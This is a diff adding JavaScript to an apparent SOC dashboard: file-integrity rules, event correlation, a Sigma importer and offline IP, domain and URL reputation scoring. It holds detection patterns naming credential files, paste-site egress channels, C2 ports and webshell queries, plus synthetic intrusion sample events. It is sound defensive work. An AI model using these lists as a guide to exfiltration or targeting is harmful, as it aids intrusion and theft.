+    return obj;
+  });
+}
+
+function runDetections(events){
+  const hits = [];
+  events.forEach(e=>{
+    RULES.forEach(r=>{
+      if(disabledRules.has(r.id)) return;
+      try{ if(r.test(e)) hits.push({rule:r, event:e}); }catch(err){}
+    });
+  });
+  return hits;
+}
+
+/* ================= FILE INTEGRITY MONITORING (FIM) ================= */
+let FIM_EVENTS = [];
+let FIM_HITS = [];
+
+const FIM_ACTION_WORDS = ["attributes","baseline","content","create","delete","rename","security","value"];
+function looksLikeFim(raw){
+  if(!raw || typeof raw !== "object") return false;
+  const keySet = new Set(Object.keys(raw).map(k=>k.toLowerCase()));
+  const hasStrongSignature = keySet.has("file reputation status") || keySet.has("file trust status") || keySet.has("rules name") || keySet.has("absolute file path");
+  const hasPathish = [...keySet].some(k=>k.includes("file path")||k.includes("registry path")||k==="path"||k==="file_path"||k==="filepath");
+  const actionVal = (raw["Action"]||raw["action"]||"").toString().toLowerCase();
+  const actionMatches = FIM_ACTION_WORDS.includes(actionVal);
+  return hasStrongSignature || (hasPathish && actionMatches);
+}
+
+function normalizeFimSeverity(v){
+  if(v===""||v===undefined||v===null) return "MEDIUM";
+  const n = Number(v);
+  if(!isNaN(n)){ if(n>=5) return "CRITICAL"; if(n>=4) return "HIGH"; if(n>=3) return "MEDIUM"; return "LOW"; }
+  const s = String(v).toUpperCase();
+  if(["CRITICAL","HIGH","MEDIUM","LOW"].includes(s)) return s;
+  return "MEDIUM";
+}
+
+function normalizeFimEvent(raw){
+  const g = (...keys) => { for(const k of keys){ if(raw[k]!==undefined && raw[k]!==null && raw[k]!=="") return raw[k]; } return ""; };
+  const filePath = g("Absolute File Path","File Path","file_path","filePath","path","Registry Path","registry_path");
+  return {
+    time: g("Log Source Time","event_time","Time","timestamp","@timestamp"),
+    host: g("Source Hostname","Asset Name","host","hostname","ComputerName"),
+    user: g("User ID","User Name","user","username","EffectiveUser"),
+    action: g("Action","action"),
+    filePath: filePath,
+    fileName: filePath ? filePath.split(/[\\/]/).pop() : g("File Name","file_name"),
+    process: g("Process Name","process","process_name"),
+    processPath: g("Absolute Process Path","process_path"),
+    fileHash: g("File Hash","file_hash","hash"),
+    certHash: g("File Certificate Hash","cert_hash"),
+    reputation: g("File Reputation Status","file_reputation","reputation"),
+    trustStatus: g("File Trust Status","file_trust","trust_status"),
+    category: g("Category Name","category"),
+    ruleName: g("Rules Name","rule","rule_name"),
+    eventType: g("Event Type","event_type","type"),
+    registryPath: g("Registry Path","registry_path"),
+    registryName: g("Registry Name","registry_name"),
+    platform: g("Platform","platform","os"),
+    oldContent: g("Old Content","Old Registry Value Content","old_content"),
+    newContent: g("New Content","New Registry Value Content","new_content"),
+    severity: normalizeFimSeverity(g("Severity Level","severity","Severity")),
+  };
+}
+
+const FIM_SENSITIVE_PATH_RE = /etc\/(passwd|shadow|sudoers|crontab)|ssh\/sshd_config|sshd_config|authorized_keys|system32\\drivers\\etc\\hosts|system32\\config|win\.ini|boot\.ini/i;
+const FIM_AUTORUN_DIR_RE = /\\startup\\|\/etc\/cron|\/etc\/init\.d|\/etc\/rc\.local|\/etc\/systemd\/system|start menu\\programs\\startup/i;
+
+const FIM_RULES = [
+  { id:"fim_known_bad", title:"File with known-bad reputation", severity:"CRITICAL", category:"Malware Indicator",
+    test:e=> /bad/i.test(e.reputation||""),
+    explain:e=>`Qualys flagged <b>${esc(e.fileName||e.filePath||"a file")}</b> on <b>${esc(e.host||"an unknown host")}</b> with a <b>KNOWN BAD</b> file reputation after it was ${esc(fimActionVerb(e.action))}${e.user?` by ${esc(e.user)}`:""}. This is Qualys' own threat-intel verdict, not a heuristic in this app — treat it as a confirmed indicator, not a maybe.`,
+    actions:["Isolate the host from the network immediately.","Preserve the file and its hash for forensic analysis — don't delete it yet.","Check the file hash against VirusTotal/your EDR (see the Reputation tab).","Identify what process wrote the file (Absolute Process Path) and pivot to your EDR/process logs for that host and time window.","Escalate to IR — a Qualys known-bad verdict on a live host is not typically a false positive."] },
+  { id:"fim_sensitive_system_file", title:"Change to a security-sensitive system file", severity:"HIGH", category:"Defense Evasion / Persistence",
+    test:e=> FIM_SENSITIVE_PATH_RE.test(e.filePath||""),
+    explain:e=>`<b>${esc(e.fileName||e.filePath)}</b> on <b>${esc(e.host)}</b> is a file operating systems rely on for authentication, remote access, or scheduled execution. It <b>${esc(fimActionVerb(e.action))}</b>${e.user?` — by ${esc(e.user)}`:""}. Unexpected changes here are a classic sign of credential tampering (new SSH key, new sudoer) or persistence (cron, startup config).`,
+    actions:["Confirm with the system/application owner whether this was a planned change (patch, config management run, admin task).","Diff the old vs. new content below to see exactly what changed.","For SSH/sudoers changes: look for a newly added key or user you don't recognize.","For hosts/DNS config changes: verify traffic isn't being silently redirected.","If unauthorized, restore from a known-good baseline and rotate any credentials the file could expose."] },
+  { id:"fim_registry_run_key", title:"Windows Run-key registry value changed", severity:"HIGH", category:"Persistence",
+    test:e=> /run\b/i.test(e.registryPath||"") || (/value/i.test(e.eventType||e.action||"") && /\\run\b/i.test(e.filePath||"")),
+    explain:e=>`A value under a Windows "Run" registry key <b>${esc(fimActionVerb(e.action))}</b> on <b>${esc(e.host)}</b>${e.user?` — by ${esc(e.user)}`:""}. Programs listed under Run keys launch automatically at every logon — this is one of the most common persistence mechanisms in Windows malware.`,
+    actions:["Check the new value's target binary (New Registry Value Content below) — is it a legitimate, signed application in its normal install path?","If the path is unusual (Temp, AppData, Public, ProgramData) or the binary is unsigned, treat as likely malicious.","Pull the referenced binary and check its hash reputation.","Remove the registry value if unauthorized, and check other hosts for the same value — this often gets pushed to multiple machines."] },
+  { id:"fim_new_exec_autorun", title:"New file created in an autorun/startup location", severity:"HIGH", category:"Persistence",
+    test:e=> /create/i.test(e.action||"") && FIM_AUTORUN_DIR_RE.test(e.filePath||""),
+    explain:e=>`A new file, <b>${esc(e.fileName||e.filePath)}</b>, was created in a location Windows/Linux uses to automatically run programs at startup or on a schedule, on <b>${esc(e.host)}</b>${e.user?` by ${esc(e.user)}`:""}. This is one of the most common ways malware re-establishes itself after a reboot.`,
+    actions:["Identify what created the file (Absolute Process Path / parent process below).","Check the new file's reputation and trust status.","If it's not a known, approved piece of software, remove it and hunt for the same filename/hash on other hosts.","If this is a Linux cron/systemd path, check for a corresponding scheduled job or unit file."] },
+  { id:"fim_untrusted_binary_system_path", title:"Untrusted or unsigned file written to a system path", severity:"MEDIUM", category:"Defense Evasion",
+    test:e=> /untrust/i.test(e.trustStatus||"") && /system32|program files|\/bin\/|\/usr\/|\/sbin\//i.test(e.filePath||""),
+    explain:e=>`<b>${esc(e.fileName||e.filePath)}</b> was written into a system binary directory on <b>${esc(e.host)}</b>, but Qualys marked it <b>UNTRUSTED</b> (unsigned or unrecognized). Legitimate system components are almost always signed by the OS vendor.`,
+    actions:["Check who/what wrote the file (user and Absolute Process Path below).","Verify whether this was a legitimate software install or update simply not yet in Qualys' trust catalog.","If unexplained, treat as a dropped payload — isolate the host and escalate."] },
+  { id:"fim_security_artifact_deleted", title:"Security/audit-relevant file deleted", severity:"HIGH", category:"Defense Evasion",
+    test:e=> /delete/i.test(e.action||"") && /log|audit|security|\.evtx|\/var\/log/i.test(e.filePath||""),
+    explain:e=>`<b>${esc(e.fileName||e.filePath)}</b> on <b>${esc(e.host)}</b> — a log/audit-related file — was <b>deleted</b>${e.user?` by ${esc(e.user)}`:""}. Attackers frequently clear or delete logs right after an intrusion to slow down investigation.`,
+    actions:["Check what else happened on this host around the same time — this is often the last step of an attack, not the first.","Pull logs from a centralized SIEM/forwarder if you have one, since the local copy may now be gone.","Treat this host as higher priority for a full review regardless of what else fires."] },
+  { id:"fim_permission_change_sensitive", title:"Permissions/ACL changed on a sensitive file", severity:"MEDIUM", category:"Privilege Escalation",
+    test:e=> /security/i.test(e.action||"") && FIM_SENSITIVE_PATH_RE.test(e.filePath||""),
+    explain:e=>`The permissions or access control list on <b>${esc(e.fileName||e.filePath)}</b> (<b>${esc(e.host)}</b>) were changed. This can widen who/what can read or modify a sensitive file — sometimes a precursor to further tampering.`,
+    actions:["Compare old vs. new permissions to see exactly what widened.","Confirm with the owning team whether this access change was intentional.","If unauthorized, revert the permissions and identify who made the change."] },
+  { id:"fim_high_qualys_severity", title:"High Qualys-assigned severity event", severity:"HIGH", category:"General",
+    test:e=> ["HIGH","CRITICAL"].includes(e.severity) && !FIM_SENSITIVE_PATH_RE.test(e.filePath||""),
+    explain:e=>`Qualys itself scored this event — <b>${esc(e.fileName||e.filePath)}</b> was ${esc(fimActionVerb(e.action))} — on <b>${esc(e.host)}</b> as <b>${esc(e.severity)}</b> severity, independent of this app's own rules.`,
+    actions:["Open the event in Qualys FIM for the full rule/policy context this app doesn't have (Monitoring Profile, Rule).","Treat Qualys' own severity rating as a strong prior — it usually reflects a policy tuned to your environment."] },
+];
+
+function runFimDetections(events){
+  const hits = [];
+  events.forEach(e=>{ FIM_RULES.forEach(r=>{ try{ if(r.test(e)) hits.push({rule:r, event:e}); }catch(err){} }); });
+  return hits;
+}
+
+function fimActionVerb(action){
+  const a = (action||"").toLowerCase();
+  const map = {
+    create:"created", delete:"deleted", rename:"renamed", content:"modified (content changed)",
+    attributes:"had its attributes changed", security:"had its permissions/security descriptor changed",
+    baseline:"baselined", value:"changed",
+  };
+  return map[a] || (a ? a+"'d" : "changed");
+}
+
+function buildFimSampleData(){
+  const rows = [];
+  let t = new Date("2026-07-09T08:00:00Z").getTime();
+  const push = (o)=>{ rows.push(Object.assign({"Log Source Time": new Date(t).toISOString(), "Platform":"Windows", "Severity Level":"2", "Category Name":"System", "File Reputation Status":"Known Good", "File Trust Status":"Trusted"}, o)); t += 1000*60*Math.floor(Math.random()*40+5); };
+
+  push({"Source Hostname":"WIN-DC01","User ID":"jsmith","Action":"Content","Absolute File Path":"C:\\Windows\\System32\\drivers\\etc\\hosts","Absolute Process Path":"C:\\Windows\\System32\\notepad.exe","Process Name":"notepad.exe","Rules Name":"Critical System Files","Severity Level":"4","File Reputation Status":"Unknown"});
+  push({"Source Hostname":"WIN-FIN02","User ID":"SYSTEM","Action":"Create","Absolute File Path":"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update_helper.exe","Absolute Process Path":"C:\\Users\\bob.admin\\Downloads\\installer.exe","Process Name":"installer.exe","Rules Name":"Startup Folder Monitoring","Severity Level":"5","File Reputation Status":"Known Bad","File Trust Status":"Untrusted","File Hash":"9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"});
+  push({"Source Hostname":"WIN-FIN02","User ID":"SYSTEM","Action":"Value","Event Type":"Value","Registry Path":"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","Registry Name":"WinUpdateHelper","New Registry Value Content":"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update_helper.exe","Rules Name":"Registry Run Key Monitoring","Severity Level":"5","File Trust Status":"Untrusted"});
+  push({"Source Hostname":"LINUX-APP01","User ID":"root","Action":"Content","Absolute File Path":"/etc/passwd","Rules Name":"Critical System Files (Linux)","Severity Level":"4"});
+  push({"Source Hostname":"LINUX-APP01","User ID":"root","Action":"Content","Absolute File Path":"/etc/ssh/sshd_config","Rules Name":"SSH Configuration","Severity Level":"4"});
+  push({"Source Hostname":"LINUX-APP01","User ID":"www-data","Action":"Create","Absolute File Path":"/var/www/html/uploads/shell.php","Absolute Process Path":"/usr/sbin/apache2","Process Name":"apache2","Rules Name":"Web Root Monitoring","Severity Level":"5","File Reputation Status":"Known Bad","File Trust Status":"Untrusted"});
+  push({"Source Hostname":"LINUX-APP01","User ID":"root","Action":"Delete","Absolute File Path":"/var/log/auth.log","Rules Name":"Audit Log Monitoring","Severity Level":"5"});
+  push({"Source Hostname":"WIN-DC01","User ID":"svc_backup","Action":"Security","Absolute File Path":"C:\\Windows\\System32\\config\\SAM","Rules Name":"Security Descriptor Monitoring","Severity Level":"4"});
+
+  for(let i=0;i<30;i++){
+    push({"Source Hostname":["WIN-DC01","WIN-FIN02","LINUX-APP01","WIN-WS17"][Math.floor(Math.random()*4)], "User ID":"SYSTEM",
+      "Action":["Attributes","Content","Baseline"][Math.floor(Math.random()*3)],
+      "Absolute File Path":"C:\\Program Files\\CommonApp\\logs\\app_"+i+".log",
+      "Process Name":"CommonApp.exe", "Rules Name":"Application Log Directory", "Severity Level":String(1+Math.floor(Math.random()*2))});
+  }
+  return rows;
+}
+
+function esc(s){ return (s===undefined||s===null) ? "" : String(s).replace(/[&<>"]/g, c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c])); }
+function fmtTime(t){ if(!t) return "—"; const d=new Date(t); return isNaN(d) ? esc(t) : d.toISOString().replace("T"," ").replace(".000Z","Z"); }
+function defang(s){ if(!s) return s; return String(s).replace(/\./g,"[.]").replace(/^http/i,"hxxp"); }
+function copyText(txt, el){ try{ navigator.clipboard.writeText(txt); if(el){ el.classList.add("copied"); setTimeout(()=>el.classList.remove("copied"),900);} }catch(e){} }
+window.copyText = copyText;
+
+/* ================= CORRELATION ENGINE ================= */
+function byUserAllEvents(){ const m={}; RAW_EVENTS.forEach(e=>{ if(e.user) (m[e.user]=m[e.user]||[]).push(e); }); return m; }
+
+function runCorrelations(){
+  const out = [];
+  if(!RAW_EVENTS.length) return out;
+
+  const byUser = {};
+  DET_HITS.forEach(h=>{ const u=h.event.user; if(!u) return; (byUser[u]=byUser[u]||[]).push(h); });
+
+  // 1. Multi-stage chain: >=4 distinct tactics within a 4h window for one user
+  Object.entries(byUser).forEach(([user,hits])=>{
+    hits = hits.slice().sort((a,b)=>new Date(a.event.time)-new Date(b.event.time));
+    for(let i=0;i<hits.length;i++){
+      const t0 = new Date(hits[i].event.time);
+      const win = hits.filter(h=> Math.abs(new Date(h.event.time)-t0) <= 4*3600*1000);
+      const tactics = new Set(win.map(h=>h.rule.tactic));
+      if(tactics.size>=4){
+        out.push({id:"chain_"+user, title:"Multi-stage attack chain", severity:"CRITICAL", tactic:"Multiple", entity:user,
+          detail:`${user} triggered ${tactics.size} distinct MITRE tactics (${[...tactics].join(", ")}) within a 4-hour window — consistent with an end-to-end intrusion rather than isolated noise.`,
+          events: win.map(h=>h.event)});
+        break;
+      }
+    }
+  });
+
+  // 2. Lateral / recon sweep: one src_ip touching >=5 distinct destinations within 60 min
+  const bySrc = {};
+  RAW_EVENTS.forEach(e=>{ if(e.src_ip) (bySrc[e.src_ip]=bySrc[e.src_ip]||[]).push(e); });
+  Object.entries(bySrc).forEach(([ip,evts])=>{
+    evts = evts.slice().sort((a,b)=>new Date(a.time)-new Date(b.time));
+    for(let i=0;i<evts.length;i++){
+      const t0 = new Date(evts[i].time);
+      const win = evts.filter(e=>Math.abs(new Date(e.time)-t0)<=60*60*1000);
+      const dsts = new Set(win.map(e=>e.dst_ip||e.host).filter(Boolean));
+      if(dsts.size>=5){
+        out.push({id:"sweep_"+ip, title:"Possible lateral / recon sweep", severity:"HIGH", tactic:"Lateral Movement", entity:ip,
+          detail:`Source ${ip} contacted ${dsts.size} distinct destinations within a 60-minute window.`, events:win});
+        break;
+      }
+    }
+  });
+
+  // 3. Burst of flagged activity: >=3 rule matches for one user within 10 minutes
+  Object.entries(byUser).forEach(([user,hits])=>{
+    hits = hits.slice().sort((a,b)=>new Date(a.event.time)-new Date(b.event.time));
+    for(let i=0;i<hits.length;i++){
+      const t0 = new Date(hits[i].event.time);
+      const win = hits.filter(h=>Math.abs(new Date(h.event.time)-t0)<=10*60*1000);
+      if(win.length>=3){
+        out.push({id:"burst_"+user, title:"Burst of flagged activity", severity:"MEDIUM", tactic:"Multiple", entity:user,
+          detail:`${user} triggered ${win.length} separate rule matches within a 10-minute window.`, events:win.map(h=>h.event)});
+        break;
+      }
+    }
+  });
+
+  // 4. Rare parent→child execution baseline (shells/interpreters seen only once)
+  const pairCounts = {};
+  RAW_EVENTS.forEach(e=>{ if(e.parent&&e.process){ const k=e.parent+" → "+e.process; (pairCounts[k]=pairCounts[k]||[]).push(e); } });
+  const rarePairs = [];
+  Object.entries(pairCounts).forEach(([k,evts])=>{
+    if(evts.length<=1 && /cmd\.exe|powershell\.exe|bash$|\bsh$|wscript|cscript|mshta/i.test(k)){
+      rarePairs.push({id:"rare_"+k, title:"Rare parent → child execution", severity:"MEDIUM", tactic:"Execution", entity:evts[0].host,
+        detail:`"${k}" was seen only once across the loaded dataset — uncommon execution patterns for interpreters/shells are worth a manual look even without a signature match.`, events:evts});
+    }
+  });
+  out.push(...rarePairs.slice(0,15));
+
+  // 5. Off-hours privileged burst
+  Object.entries(byUser).forEach(([user,hits])=>{
+    if(!/admin|root/i.test(user)) return;
+    const offhours = hits.filter(h=>{ const hr=new Date(h.event.time).getUTCHours(); return !isNaN(hr)&&(hr<6||hr>=20); });
+    if(offhours.length>=3){
+      out.push({id:"offhours_"+user, title:"Off-hours privileged activity burst", severity:"HIGH", tactic:"Discovery", entity:user,
+        detail:`${user} triggered ${offhours.length} rule matches outside the 06:00–20:00 UTC window.`, events:offhours.map(h=>h.event)});
+    }
+  });
+
+  // 6. Watchlist hits
+  if(wlIps.length || wlDomains.length){
+    const hitEvts = RAW_EVENTS.filter(e=> wlIps.includes(e.src_ip)||wlIps.includes(e.dst_ip)||wlDomains.includes((e.domain||"").toLowerCase()));
+    if(hitEvts.length){
+      out.push({id:"watchlist_hit", title:"Watchlist indicator observed", severity:"CRITICAL", tactic:"Threat Intel", entity:"multiple",
+        detail:`${hitEvts.length} event(s) touched a watchlisted IP or domain.`, events:hitEvts});
+    }
+  }
+
+  // 7. Impossible travel (requires IP intel with country column)
+  if(Object.keys(ipIntel).length){
+    Object.entries(byUserAllEvents()).forEach(([user,evts])=>{
+      evts = evts.slice().sort((a,b)=>new Date(a.time)-new Date(b.time));
+      for(let i=0;i<evts.length;i++){
+        const t0 = new Date(evts[i].time);
+        const win = evts.filter(e=>Math.abs(new Date(e.time)-t0)<=4*3600*1000);
+        const countries = new Set(win.map(e=>(ipIntel[e.src_ip]||{}).country).filter(Boolean));
+        if(countries.size>=2){
+          out.push({id:"travel_"+user, title:"Impossible travel", severity:"HIGH", tactic:"Initial Access", entity:user,
+            detail:`${user} was seen from ${countries.size} distinct countries (${[...countries].join(", ")}) within a 4-hour window.`, events:win});
+          break;
+        }
+      }
+    });
+  }
+
+  return out;
+}
+
+function corrScoreForEntity(name, isHost){
+  return CORR_HITS.filter(c=> c.entity===name || (c.events||[]).some(e=> (isHost? e.host : e.user)===name))
+    .reduce((a,c)=>a+(sevWeight[c.severity]||1),0);
+}
+
+/* ================= SIGMA IMPORT ================= */
+function parseYamlSubset(text){
+  const lines = text.split("\n").map(l=>l.replace(/\t/g,"  ")).filter(l=>l.trim()!=="" && !l.trim().startsWith("#"));
+  let idx = 0;
+  const indentOf = l => l.match(/^ */)[0].length;
+  const stripQuotes = s => s.replace(/^['"]|['"]$/g,"");
+  function parseList(minIndent){
+    const arr = [];
+    while(idx<lines.length){
+      const line = lines[idx];
+      if(indentOf(line) < minIndent) break;
+      const trimmed = line.trim();
+      if(!trimmed.startsWith("- ")) break;
+      arr.push(stripQuotes(trimmed.slice(2).trim()));
+      idx++;
+    }
+    return arr;
+  }
+  function parseBlock(minIndent){
+    const obj = {};
+    while(idx < lines.length){
+      const line = lines[idx];
+      const ind = indentOf(line);
+      if(ind < minIndent) break;
+      const trimmed = line.trim();
+      if(trimmed.startsWith("- ")) break;
+      const m = trimmed.match(/^([^:]+):\s*(.*)$/);
+      if(!m){ idx++; continue; }
+      const key = m[1].trim();
+      const val = m[2].trim();
+      idx++;
+      if(val === ""){
+        if(idx<lines.length && lines[idx].trim().startsWith("- ") && indentOf(lines[idx])>ind){
+          obj[key] = parseList(indentOf(lines[idx]));
+        } else if(idx<lines.length && indentOf(lines[idx])>ind){
+          obj[key] = parseBlock(indentOf(lines[idx]));
+        } else {
+          obj[key] = null;
+        }
+      } else {
+        obj[key] = stripQuotes(val);
+      }
+    }
+    return obj;
+  }
+  return parseBlock(0);
+}
+
+const SIGMA_FIELD_MAP = {
+  commandline:"cmd", command_line:"cmd", cmd:"cmd",
+  image:"process", filename:"process", processname:"process", process:"process",
+  parentimage:"parent", parentbasefilename:"parent", parent:"parent", parentprocess:"parent",
+  computername:"host", hostname:"host", host:"host", dvc:"host",
+  user:"user", username:"user", account:"user", src_user:"user",
+  destinationip:"dst_ip", dst_ip:"dst_ip", remoteaddressip4:"dst_ip", dstip:"dst_ip",
+  sourceip:"src_ip", src_ip:"src_ip", srcip:"src_ip",
+  destinationport:"dst_port", dst_port:"dst_port", dstport:"dst_port",
+  domain:"domain", query:"domain",
+  sha256hashdata:"hash", hash:"hash", sha256:"hash", filehash:"hash",
+  url:"url", requesturl:"url",
+};
+function compileSigma(text){
+  let doc;
+  try{ doc = parseYamlSubset(text); }catch(e){ return {error:"YAML parse error: "+e.message}; }
+  if(!doc || !doc.detection) return {error:"Missing a 'detection' block."};
+  const selection = doc.detection.selection;
+  if(!selection || typeof selection !== "object") return {error:"Missing 'detection.selection' — that's the only structure this importer supports."};
+  const condition = (doc.detection.condition||"selection").toString().trim();
+  if(condition !== "selection") return {error:`Unsupported condition '${condition}'. Only 'condition: selection' (AND of every field under selection) is supported by this lightweight importer.`};
+
+  const checks = [];
+  const unknownFields = [];
+  Object.entries(selection).forEach(([rawKey, rawVal])=>{
+    const parts = rawKey.split("|");
+    const field = parts[0].trim().toLowerCase();
+    const modifier = (parts[1]||"equals").trim().toLowerCase();
+    const mapped = SIGMA_FIELD_MAP[field];
+    if(!mapped){ unknownFields.push(rawKey); return; }
+    const values = Array.isArray(rawVal) ? rawVal : [rawVal];
+    checks.push({field:mapped, modifier, values: values.map(v=>String(v))});
+  });
+  if(!checks.length) return {error:"No recognized fields in 'selection'. Recognized: CommandLine, Image, ParentImage, ComputerName, User, DestinationIp, SourceIp, DestinationPort, Domain, Hash, Url — with |contains, |startswith, |endswith, |re modifiers."};
+
+  function matchOne(check, eventVal){
+    eventVal = String(eventVal===undefined||eventVal===null ? "" : eventVal);
+    return check.values.some(v=>{
+      switch(check.modifier){
+        case "contains": return eventVal.toLowerCase().includes(v.toLowerCase());
+        case "startswith": return eventVal.toLowerCase().startsWith(v.toLowerCase());
+        case "endswith": return eventVal.toLowerCase().endsWith(v.toLowerCase());
+        case "re": try{ return new RegExp(v,"i").test(eventVal); }catch(e){ return false; }
+        default: return eventVal.toLowerCase() === v.toLowerCase();
+      }
+    });
+  }
+  const test = (e)=> checks.every(c => matchOne(c, e[c.field]));
+
+  const tagsArr = Array.isArray(doc.tags) ? doc.tags : [];
+  const techTag = tagsArr.find(t=>/^attack\.t\d/i.test(t));
+  const technique = techTag ? techTag.replace(/^attack\./i,"").toUpperCase() : "N/A";
+  const tacticTag = tagsArr.find(t=>/^attack\.[a-z_]+$/i.test(t) && !/^attack\.t\d/i.test(t));
+  const tactic = tacticTag ? tacticTag.replace(/^attack\./i,"").replace(/_/g," ").replace(/\b\w/g,c=>c.toUpperCase()) : "Custom";
+  const levelMap = {critical:"CRITICAL",high:"HIGH",medium:"MEDIUM",low:"LOW"};
+  const severity = levelMap[(doc.level||"medium").toString().toLowerCase()] || "MEDIUM";
+  const id = "custom_" + (doc.id || (doc.title||"rule").toLowerCase().replace(/[^a-z0-9]+/g,"_")).toString().slice(0,40);
+
+  if(RULES.some(r=>r.id===id)) return {error:`A rule with id '${id}' already exists — remove it first or set a different Sigma 'id'.`};
+
+  const rule = { id, title: doc.title || "Untitled custom rule", tactic, technique, severity, test, custom:true, sigmaSrc:text,
+    desc: checks.map(c=>`${c.field} ${c.modifier} ${JSON.stringify(c.values)}`).join(" AND "),
+    playbook: "Custom Sigma-imported rule — validate matches manually and document a response playbook once confirmed." };
+  if(unknownFields.length) rule.warning = "Ignored unrecognized field(s): "+unknownFields.join(", ");
+  return {rule};
+}
+
+/* ================= WATCHLISTS & INTEL ================= */
+function applyWatchlist(){
+  const lines = (document.getElementById("wlInput").value||"").split("\n").map(l=>l.trim()).filter(Boolean);
+  wlIps = lines.filter(l=>/^\d{1,3}(\.\d{1,3}){3}$/.test(l));
+  wlDomains = lines.filter(l=>!/^\d{1,3}(\.\d{1,3}){3}$/.test(l)).map(l=>l.toLowerCase());
+  document.getElementById("wlStatus").textContent = `Applied: ${wlIps.length} IP(s), ${wlDomains.length} domain(s).`;
+  CORR_HITS = runCorrelations();
+  renderCorrelations(); renderUsers(); renderReport();
+}
+function applyIntel(){
+  ipIntel = {};
+  (document.getElementById("intelInput").value||"").split("\n").map(l=>l.trim()).filter(Boolean).forEach(line=>{
+    const parts = line.split(",").map(s=>s&&s.trim());
+    if(parts[0]) ipIntel[parts[0]] = {country: parts[1]||"", asn: parts[2]||""};
+  });
+  document.getElementById("intelStatus").textContent = `Applied intel for ${Object.keys(ipIntel).length} IP(s).`;
+  CORR_HITS = runCorrelations();
+  renderCorrelations(); renderTools();
+}
+
+/* ================= REPUTATION — OFFLINE SCORING ================= */
+let repApiKeys = { vt:"", abuseipdb:"" };
+try{ const saved = JSON.parse(localStorage.getItem("soc_rep_keys")||"null"); if(saved) repApiKeys = saved; }catch(e){}
+
+const SUSPICIOUS_TLDS = ["xyz","top","tk","zip","gq","cf","ml","ga","icu","click","country","stream"];
+const URL_SHORTENERS = ["bit.ly","tinyurl.com","t.co","goo.gl","is.gd","ow.ly","buff.ly"];
+const PASTE_SHARE_SITES = ["pastebin.com","transfer.sh","anonfiles.com","file.io","0bin.net","ghostbin.com"];
+const DYNDNS_PROVIDERS = ["duckdns.org","no-ip.com","no-ip.org","dyndns.org","ddns.net","freedynamicdns.org"];
+
+function shannonEntropy(str){
+  const freq = {};
+  for(const ch of str) freq[ch] = (freq[ch]||0)+1;
+  const len = str.length;
+  let ent = 0;
+  Object.values(freq).forEach(c=>{ const p=c/len; ent -= p*Math.log2(p); });
+  return ent;
+}
+function verdictFromScore(score){ if(score>=65) return "Malicious"; if(score>=40) return "Suspicious"; if(score>=15) return "Low"; return "Clean"; }
+function verdictColor(v){ return {Clean:"var(--low)",Low:"var(--accent)",Suspicious:"var(--med)",Malicious:"var(--crit)"}[v] || "var(--text-faint)"; }
+
+function scoreIP(ip){
+  if(isPrivateIp(ip)) return {score:0, verdict:"Clean", reasons:["Private/internal address (RFC1918) — not internet-routable"]};
+  const reasons = ["Public address (baseline)"];
+  let score = 5;
+  if(wlIps.includes(ip)){ score+=60; reasons.push("Present on your watchlist"); }
+  if((window.__flaggedIps||new Set()).has(ip)){ score+=35; reasons.push("Co-occurred with a fired detection rule"); }
+  if(CORR_HITS.some(c=> c.entity===ip || (c.events||[]).some(e=>e.dst_ip===ip||e.src_ip===ip))){ score+=20; reasons.push("Involved in a cross-event correlation (chain/sweep/burst)"); }
+  if(RAW_EVENTS.some(e=> e.dst_ip===ip && e.dst_port && [4444,1337,31337,6667,8081,8082].includes(Number(e.dst_port)))){ score+=15; reasons.push("Seen on a non-standard/suspicious destination port"); }
+  score = Math.min(100,score);
+  return {score, verdict:verdictFromScore(score), reasons};
+}
+function scoreDomain(domain){
+  const d = (domain||"").toLowerCase();
+  const reasons = ["Baseline (unknown domain)"];
+  let score = 5;
+  const tld = d.split(".").pop();
+  if(SUSPICIOUS_TLDS.includes(tld)){ score+=25; reasons.push(`Suspicious/low-cost TLD (.${tld})`); }
+  if(wlDomains.includes(d)){ score+=60; reasons.push("Present on your watchlist"); }
+  if((window.__flaggedDomains||new Set()).has(domain)){ score+=35; reasons.push("Co-occurred with a fired detection rule"); }
+  if(PASTE_SHARE_SITES.some(s=>d.endsWith(s))){ score+=20; reasons.push("Known paste/file-share service — capable of data egress"); }
+  if(DYNDNS_PROVIDERS.some(s=>d.endsWith(s))){ score+=15; reasons.push("Free dynamic DNS provider — common in C2 infrastructure"); }
+  if(d.startsWith("xn--") || d.includes(".xn--")){ score+=25; reasons.push("Punycode encoding — possible homograph/lookalike domain"); }
+  const labels = d.split(".");
+  const sub = labels.slice(0, Math.max(0,labels.length-2)).join("");
+  if(sub.length>=12){ const ent = shannonEntropy(sub); if(ent>3.3){ score+=20; reasons.push(`High-entropy subdomain (${ent.toFixed(1)} bits/char) — possible DGA`); } }
+  score = Math.min(100,score);
+  return {score, verdict:verdictFromScore(score), reasons};
+}
+function scoreURL(url){
+  const reasons = ["Baseline (unknown URL)"];
+  let score = 5, u;
+  try{ u = new URL(url); }catch(e){ return {score, verdict:"Clean", reasons:["Could not parse URL"]}; }
+  const host = u.hostname.toLowerCase();
+  const isIpHost = /^\d{1,3}(\.\d{1,3}){3}$/.test(host);
+  if(isIpHost){ score+=20; reasons.push("Raw IP address used instead of a domain name"); }
+  if(URL_SHORTENERS.includes(host)){ score+=15; reasons.push("Known URL shortener — real destination is hidden"); }
+  if(u.port && !["","80","443","8080"].includes(u.port)){ score+=10; reasons.push(`Non-standard port in URL (${u.port})`); }
+  if(/\/(gate|panel|admin\/login)\.php|[?&](cmd|c|exec)=/i.test(u.pathname+u.search)){ score+=15; reasons.push("Path/query pattern often seen in C2 panels or webshells"); }
+  if(wlDomains.includes(host) || wlIps.includes(host)){ score+=60; reasons.push("Host present on your watchlist"); }
+  if((window.__flaggedDomains||new Set()).has(host)){ score+=35; reasons.push("Host co-occurred with a fired detection rule"); }
+  if(!isIpHost){ const ds = scoreDomain(host); score += Math.round(ds.score*0.3); if(ds.reasons.length>1) reasons.push(...ds.reasons.slice(1).map(r=>"Host: "+r)); }
+  score = Math.min(100,score);
+  return {score, verdict:verdictFromScore(score), reasons};
+}
+
+function btoaSafe(s){ try{ return btoa(unescape(encodeURIComponent(s))).replace(/[^a-zA-Z0-9]/g,""); }catch(e){ return String(s).replace(/[^a-zA-Z0-9]/g,""); } }
+
